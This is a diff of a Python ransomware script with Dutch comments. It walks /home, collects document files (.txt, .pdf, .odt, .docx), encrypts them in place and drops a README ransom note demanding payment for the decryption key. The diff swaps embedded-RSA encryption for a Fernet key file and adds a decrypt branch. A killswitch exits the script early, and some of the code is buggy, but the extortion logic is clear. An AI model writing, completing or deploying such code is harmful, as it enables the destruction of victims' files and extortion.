@@ -1,7 +1,5 @@
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP
-import base64
 import os
+from cryptography.fernet import Fernet
 
 #Killswitch Functie
 Killswitch = True
@@ -10,16 +8,8 @@ if Killswitch==True:
     exit()
 else:
     pass
-#Publiek key maken, en in een RSA key functie zetten.
-#Pub key gecodeerd in Base64 Voor transport.
-Pub_key_Base64 = str(" LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEyMHVZbHdoS1ZHai9OUFdWeG9KcwpYV2pzVlpZbWlUYjFBTjhET1o1SnlBM04rUUFnZy9tRXhoTFdHVG9FMmNtSWtKc1JjK2tqZkIwYTJ4dW1sU1NTCncrL1FaRllsMFFwTlFPNFJjamNDcHUrVU5VQXJTVmU2cE9pVU1xcGdDWS82LzJMeHpNYlVDbXEzcVNudFVORXEKMzRxc1phbWlMbXJ4aUF6eXJRTlJrS2tLNzBva3BtbUpNdjRINDlnR3F0cWJocTB2YWRNaktEcVhmaE5SNHAyZApjUDJPSC96OGliWXp5WDR4bDMwZkVDWXl4SEpycHgraUZRaGhBazNrQklLR1E4L2ErcFNPOGE1emtVbnFFZW1FCkpNa2huck0xanpSOUJtRWtScFlpTnR0OER1MkpFZDdrZnhKL2xTV2NLVlZtWHBncGNtcEMrRllxMUJQeStCV1kKaVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t")
-Base64_bytes = Pub_key_Base64.encode('ascii')
-Pub_key_string_byte = base64.b64decode(Base64_bytes)
-Pub_key = Pub_key_string_byte.decode('ascii')
 
-RSA_key = RSA.import_key(str(Pub_key))
-#Gebruik de RSA key in de PKCS1 Encryptie functie.
-cipher_rsa = PKCS1_OAEP.new(RSA_key)
+check = open("Decrypt.txt", "r")
 
 #Hier zoek functie
 #Def var voor opslaan van lijstdata van zoekfunctie.
@@ -31,23 +21,38 @@ for dirpath, dirs, files in os.walk('/home'):
     if fname.endswith('.txt') or fname.endswith('.pdf') or fname.endswith('.odt') or fname.endswith('.docx'):
       bestandenlijst.append(fname)
 
-
-#Encryptiefunctie gebaseerd op lijst.
-for file in bestandenlijst:
-    with open(file, 'rb') as f:
-        file_inhoud = f.read()
-    versleutelde_data = cipher_rsa.encrypt(file_inhoud.encode("utf-8"))
-    with open(file, 'wb') as f:
-        f.write(versleutelde_data)
-
-#Hier decrypt functie
-#RSA_key_decrypt = RSA.import_key("decrypt_key.key")
+#Decrypt
+if check == 1:
+   with open('key.txt', 'rb') as f:
+      key = f.read()
+      f = Fernet(key)
+   for file in bestandenlijst:
+      with open(file, 'rb') as f:
+         file_inhoud = f.read()
+      ontsleutelde_inhoud = f.decrypt(file_inhoud)
+      with open(file, 'wb') as f:
+         f.write(ontsleutelde_inhoud)
+else:
+   #Encryptiefunctie gebaseerd op lijst.
+    with open('key.txt', 'rb') as f:
+       key = f.read()
+       f = Fernet(key)
+    for file in bestandenlijst:
+        with open(file, 'rb') as f:
+            file_inhoud = f.read()
+        versleutelde_data = f.encrypt(file_inhoud)
+        with open(file, 'wb') as f:
+            f.write(versleutelde_data)
 
 #Readme aanmaken.
 Readme = open("README.txt","w")
 Readme.write("Hallo! Je hebt encryptiesoftware geactiveerd!\n Om je bestanden tedecrypten moet je geld overmaken naar XXX.\n Dan zal je de decryptkey ontvangen!")
 Readme.close()
 
+#Decryptfile
+Decrypt = open("Decrypt.txt","w")
+Decrypt.write("1")
+Decrypt.close()
 
 #Endstage
 print("Code 200!")
